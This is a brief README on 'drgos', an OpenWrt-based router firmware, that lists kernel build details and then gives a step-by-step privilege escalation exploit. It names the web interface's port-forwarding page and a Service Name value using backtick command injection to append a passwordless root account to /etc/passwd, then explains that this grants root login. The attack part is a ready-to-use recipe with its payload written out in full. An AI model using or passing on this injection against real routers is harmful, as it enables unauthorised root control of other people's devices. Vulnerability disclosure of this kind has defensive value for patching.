# drgos

OpenWrt based operating system.

Uses Linux kernel (version 2.6.33.5-drgos-hrg1000-1.6.5-R).

Linux kernel has been compiled with gcc version 4.1.2 on Wed Aug 1 00:49:40 CEST 2012 by user pingelfeldt@se-builder

## Priviledge escalation exploit

The web interface is vulnerable to a privilege escalation exploit, which allows an attacker to gain root access.

http://192.168.1.254/cgi-bin/webif/nat-pfwd.sh

Port Forwarding Rules > Add New Rule

<code>
    <pre>
        Service Name: test`echo 'haxor::0:0:root:/root:/bin/sh' >> /etc/passwd`
        Public Ports: 80
        Local IP Address: 192.168.10.30
        Local Ports: 80
        Protocol: Both
    </pre>
</code>

Click Save

The exploit works by injecting a new user into the /etc/passwd file, which allows the attacker to log in as root.
